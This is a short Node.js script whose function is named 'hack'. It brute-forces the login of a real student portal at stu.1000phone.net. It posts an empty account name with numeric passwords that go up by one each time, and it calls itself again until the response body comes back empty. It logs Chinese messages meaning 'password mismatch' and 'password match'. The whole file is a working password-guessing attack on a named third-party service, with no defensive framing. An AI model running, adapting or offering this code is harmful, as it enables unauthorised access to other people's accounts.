var request = require('request');
var PassWord = 1;
function hack() {
    request.post({
        url: 'http://stu.1000phone.net/student.php/Public/login',
        formData: {
            "Account": "",
            "PassWord": ++PassWord
        }
    }, function optionalCallback(err, httpResponse, body) {
        if(body){
            console.log("密码不匹配",PassWord)
            hack()
        }else{
            console.log("密码匹配",PassWord)
        }
    });
}
hack();